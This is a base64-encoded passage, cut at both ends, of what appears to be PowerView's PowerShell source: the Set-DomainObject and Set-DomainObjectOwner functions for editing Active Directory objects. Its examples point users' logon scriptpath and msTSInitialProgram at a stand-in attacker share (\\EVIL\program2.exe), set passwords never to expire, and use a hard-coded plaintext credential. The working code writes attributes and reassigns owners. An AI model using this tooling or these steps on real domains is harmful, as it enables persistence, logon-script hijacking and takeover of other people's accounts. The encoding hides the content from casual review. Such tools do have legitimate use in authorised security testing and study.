aWFscHJvZ3JhbSB0byBcXEVWSUxccHJvZ3JhbS5leGUgZm9yIG9iamVjdCB0ZXN0dXNlcgoKLkVYQU1QTEUKCiJTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgiLCJ0ZXN0dXNlciIgfCBTZXQtRG9tYWluT2JqZWN0IC1TZXQgQHsnY291bnRyeWNvZGUnPTEyMzQ7ICdtc3RzaW5pdGlhbHByb2dyYW0nPSdcXEVWSUxccHJvZ3JhbTIuZXhlJ30gLVZlcmJvc2UKClZFUkJPU0U6IEdldC1Eb21haW5TZWFyY2hlciBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOgooJih8KG9iamVjdHNpZD1TLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpKSkKVkVSQk9TRTogU2V0dGluZyBtc3RzaW5pdGlhbHByb2dyYW0gdG8gXFxFVklMXHByb2dyYW0yLmV4ZSBmb3Igb2JqZWN0IGhhcm1qMHkKVkVSQk9TRTogU2V0dGluZyBjb3VudHJ5Y29kZSB0byAxMjM0IGZvciBvYmplY3QgaGFybWoweQpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzoKTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT10ZXN0dXNlcikpKQpWRVJCT1NFOiBTZXR0aW5nIG1zdHNpbml0aWFscHJvZ3JhbSB0byBcXEVWSUxccHJvZ3JhbTIuZXhlIGZvciBvYmplY3QgdGVzdHVzZXIKVkVSQk9TRTogU2V0dGluZyBjb3VudHJ5Y29kZSB0byAxMjM0IGZvciBvYmplY3QgdGVzdHVzZXIKCi5FWEFNUExFCgoiUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4IiwidGVzdHVzZXIiIHwgU2V0LURvbWFpbk9iamVjdCAtQ2xlYXIgZGVwYXJ0bWVudCAtVmVyYm9zZQoKQ2xlYXJlcyB0aGUgJ2RlcGFydG1lbnQnIGZpZWxkIGZvciBib3RoIG9iamVjdCBpZGVudGl0aWVzLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIHRlc3R1c2VyIHwgQ29udmVydEZyb20tVUFDVmFsdWUgLVZlcmJvc2UKCk5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZQotLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0KTk9STUFMX0FDQ09VTlQgICAgICAgICAgICAgICAgIDUxMgoKClNldC1Eb21haW5PYmplY3QgLUlkZW50aXR5IHRlc3R1c2VyIC1YT1IgQHt1c2VyYWNjb3VudGNvbnRyb2w9NjU1MzZ9IC1WZXJib3NlCgpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT10ZXN0dXNlcikpKQpWRVJCT1NFOiBYT1JpbmcgJ3VzZXJhY2NvdW50Y29udHJvbCcgd2l0aCAnNjU1MzYnIGZvciBvYmplY3QgJ3Rlc3R1c2VyJwoKR2V0LURvbWFpblVzZXIgdGVzdHVzZXIgfCBDb252ZXJ0RnJvbS1VQUNWYWx1ZSAtVmVyYm9zZQoKTmFtZSAgICAgICAgICAgICAgICAgICAgICAgICAgIFZhbHVlCi0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAtLS0tLQpOT1JNQUxfQUNDT1VOVCAgICAgICAgICAgICAgICAgNTEyCkRPTlRfRVhQSVJFX1BBU1NXT1JEICAgICAgICAgICA2NTUzNgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIC1JZGVudGl0eSB0ZXN0dXNlciAtUHJvcGVydGllcyBzY3JpcHRwYXRoCgpzY3JpcHRwYXRoCi0tLS0tLS0tLS0KXFxwcmltYXJ5XHN5c3ZvbFxibGFoLnBzMQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJy1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpTZXQtRG9tYWluT2JqZWN0IC1JZGVudGl0eSB0ZXN0dXNlciAtU2V0IEB7J3NjcmlwdHBhdGgnPSdcXEVWSUxccHJvZ3JhbTIuZXhlJ30gLUNyZWRlbnRpYWwgJENyZWQgLVZlcmJvc2UKVkVSQk9TRTogW0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbgpWRVJCT1NFOiBbR2V0LURvbWFpbl0gRXh0cmFjdGVkIGRvbWFpbiAnVEVTVExBQicgZnJvbSAtQ3JlZGVudGlhbApWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBMREFQIGNvbm5lY3Rpb24KVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofCh8KHNhbUFjY291bnROYW1lPXRlc3R1c2VyKShuYW1lPXRlc3R1c2VyKSkpKQpWRVJCT1NFOiBbU2V0LURvbWFpbk9iamVjdF0gU2V0dGluZyAnc2NyaXB0cGF0aCcgdG8gJ1xcRVZJTFxwcm9ncmFtMi5leGUnIGZvciBvYmplY3QgJ3Rlc3R1c2VyJwoKR2V0LURvbWFpblVzZXIgLUlkZW50aXR5IHRlc3R1c2VyIC1Qcm9wZXJ0aWVzIHNjcmlwdHBhdGgKCnNjcmlwdHBhdGgKLS0tLS0tLS0tLQpcXEVWSUxccHJvZ3JhbTIuZXhlCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdSZWFwbGNlJyldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkU2V0LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtIYXNodGFibGVdCiAgICAgICAgJFhPUiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsZWFyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsnUmF3JyA9ICRUcnVlfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0lkZW50aXR5J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5IH0KCiAgICAgICAgIyBzcGxhdCB0aGUgYXBwcm9wcmlhdGUgYXJndW1lbnRzIHRvIEdldC1Eb21haW5PYmplY3QKICAgICAgICAkUmF3T2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkUmF3T2JqZWN0KSB7CgogICAgICAgICAgICAkRW50cnkgPSAkUmF3T2JqZWN0LkdldERpcmVjdG9yeUVudHJ5KCkKCiAgICAgICAgICAgIGlmKCRQU0JvdW5kUGFyYW1ldGVyc1snU2V0J10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydTZXQnXS5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltTZXQtRG9tYWluT2JqZWN0XSBTZXR0aW5nICckKCRfLk5hbWUpJyB0byAnJCgkXy5WYWx1ZSknIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKSciCiAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeS5wdXQoJF8uTmFtZSwgJF8uVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3Igc2V0dGluZy9yZXBsYWNpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFBTQm91bmRQYXJhbWV0ZXJzWydYT1InXSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUFNCb3VuZFBhcmFtZXRlcnNbJ1hPUiddLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb3BlcnR5TmFtZSA9ICRfLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJFByb3BlcnR5WG9yVmFsdWUgPSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpbk9iamVjdF0gWE9SaW5nICckUHJvcGVydHlOYW1lJyB3aXRoICckUHJvcGVydHlYb3JWYWx1ZScgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFR5cGVOYW1lID0gJEVudHJ5LiRQcm9wZXJ0eU5hbWVbMF0uR2V0VHlwZSgpLm5hbWUKCiAgICAgICAgICAgICAgICAgICAgICAgICMgVUFDIHZhbHVlIHJlZmVyZW5jZXMtIGh0dHBzOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2VuLXVzL2tiLzMwNTE0NAogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlWYWx1ZSA9ICQoJEVudHJ5LiRQcm9wZXJ0eU5hbWUpIC1ieG9yICRQcm9wZXJ0eVhvclZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeS4kUHJvcGVydHlOYW1lID0gJFByb3BlcnR5VmFsdWUgLWFzICRUeXBlTmFtZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRW50cnkuY29tbWl0Y2hhbmdlcygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RdIEVycm9yIFhPUidpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFBTQm91bmRQYXJhbWV0ZXJzWydDbGVhciddKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVyc1snQ2xlYXInXSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb3BlcnR5TmFtZSA9ICRfCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltTZXQtRG9tYWluT2JqZWN0XSBDbGVhcmluZyAnJFByb3BlcnR5TmFtZScgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyIKICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5LiRQcm9wZXJ0eU5hbWUuY2xlYXIoKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRW50cnkuY29tbWl0Y2hhbmdlcygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RdIEVycm9yIGNsZWFyaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gU2V0LURvbWFpbk9iamVjdE93bmVyIHsKPCMKLlNZTk9QU0lTCgpNb2RpZmllcyB0aGUgb3duZXIgZm9yIGEgc3BlY2lmaWVkIGFjdGl2ZSBkaXJlY3Rvcnkgb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0ICAKCi5ERVNDUklQVElPTgoKUmV0cmlldmVzIHRoZSBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdCBzcGVjaWZpZWQgYnkgLUlkZW50aXR5IGJ5IHNwbGF0dGluZyB0bwpHZXQtRG9tYWluT2JqZWN0LCByZXR1cm5pbmcgdGhlIHJhdyBzZWFyY2hyZXN1bHQgb2JqZWN0LiBSZXRyaWV2ZXMgdGhlIHJhdwpkaXJlY3RvcnllbnRyeSBmb3IgdGhlIG9iamVjdCwgYW5kIHNldHMgdGhlIG9iamVjdCBvd25lciB0byAtT3duZXJJZGVudGl0eS4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKb2YgdGhlIEFEIG9iamVjdCB0byBzZXQgdGhlIG93bmVyIGZvci4KCi5QQVJBTUVURVIgT3duZXJJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBoYXJtajB5KSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAxKQpvZiB0aGUgb3duZXIgdG8gc2V0IGZvciAtSWRlbnRpdHkuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpTZXQtRG9tYWluT2JqZWN0T3duZXIgLUlkZW50aXR5IGRmbSAtT3duZXJJZGVudGl0eSBoYXJtajB5CgpTZXQgdGhlIG93bmVyIG9mICdkZm0nIGluIHRoZSBjdXJyZW50IGRvbWFpbiB0byAnaGFybWoweScuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKU2V0LURvbWFpbk9iamVjdE93bmVyIC1JZGVudGl0eSBkZm0gLU93bmVySWRlbnRpdHkgaGFybWoweSAtQ3JlZGVudGlhbCAkQ3JlZAoKU2V0IHRoZSBvd25lciBvZiAnZGZtJyBpbiB0aGUgY3VycmVudCBkb21haW4gdG8gJ2hhcm1qMHknIHVzaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ093bmVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3duZXJJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0